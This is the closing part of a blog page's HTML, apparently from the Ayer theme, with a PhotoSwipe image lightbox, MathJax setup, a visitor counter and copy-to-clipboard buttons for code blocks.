    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->
 <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js"></script>
<script src="https://cdn.staticfile.org/mathjax/2.7.7/config/TeX-AMS-MML_HTMLorMML-full.js"></script>
<script>
  var ayerConfig = {
    mathjax: true,
  };
</script>

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->
 
<script src="/js/clickBoom2.js"></script>
 
<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->

<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>